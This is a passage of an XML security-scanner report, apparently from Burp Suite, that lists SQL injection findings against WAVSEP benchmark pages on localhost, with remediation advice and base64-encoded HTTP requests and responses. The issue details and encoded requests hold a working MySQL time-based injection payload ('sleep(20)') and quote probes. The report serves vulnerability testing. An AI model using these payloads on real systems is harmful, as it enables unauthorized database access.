      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDcgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIGN1cnJlbnQgZGF0YWJhc2UgdXNlciBkZXRhaWxzLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDcgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIGN1cnJlbnQgZGF0YWJhc2UgdXNlciBkZXRhaWxzLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5985625203351165952</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case08-InjectionInSearch-RetrieveServerMAC-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case08-InjectionInSearch-RetrieveServerMAC-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20013</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1Nzo0NiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDggLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIHNlcnZlciBNQUMgYWRkcmVzcy48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA4LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlU2VydmVyTUFDLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDggLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IFJldHJpZXZlIHNlcnZlciBNQUMgYWRkcmVzcy48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3247774386050366464</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case09-InjectionInSearch-RetrievePrivilegesOnDatabase-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case09-InjectionInSearch-RetrievePrivilegesOnDatabase-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
